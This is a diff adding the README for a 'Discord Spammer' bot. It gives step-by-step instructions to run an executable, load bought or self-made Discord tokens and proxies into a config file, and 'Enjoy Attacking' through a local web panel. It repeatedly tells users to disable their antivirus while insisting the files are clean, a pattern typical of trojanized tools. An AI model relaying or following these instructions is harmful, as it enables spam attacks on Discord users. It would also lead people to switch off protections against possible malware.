@@ -1,0 +1,33 @@
+THANK YOU FOR USING DISCORD SPAMMER! HERE ARE THE INSTRUCTIONS!
+
+DISCLAIMER: If you consider any of my posted files a threat to your pc and your privacy, 
+please do not use any files that I post. I care about people's safety and all my files are fully clean and safe to use,
+if you have an issue with them please let me know trough discord or the comments. 
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+!!!IMPORTANT!!!!   IF IT WON'T OPEN THE RUN.EXE OR IT CRASHES, PLEASE REINSTALL THE SPAMMER AND DISABLE YOUR ANTIVIRUS!  !!!IMPORTANT!!!|
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+User Advice: You may need to Disable your Antivirus to load the program properly
+
+1. Start the "Run" File and close it after 10 Seconds.
+
+2. Install "Node.exe".
+
+3. Search for Proxies With The Included Proxy Checker (AccountReaper) And Buy Some Discord Tokens Or Create Own Discord Accounts!
+
+4. Edit The "config.json" File With Notepad Or Editor
+
+5. Put Your Tokens In (U Need To Create Accounts And Take The Token From Them) And Proxies.
+
+6. Start The "Run.exe" File again 
+
+7. Open Your Internet Explorer And Search For localhost:1337
+
+8. Enjoy Attacking
+
+
+Don't panic if something doesn't work. This bot is still in progress and not finished yet. Be patient and wait for the next update.
+
+Premium Version:
+You are currently using the Premium Version with all Premium Features. 
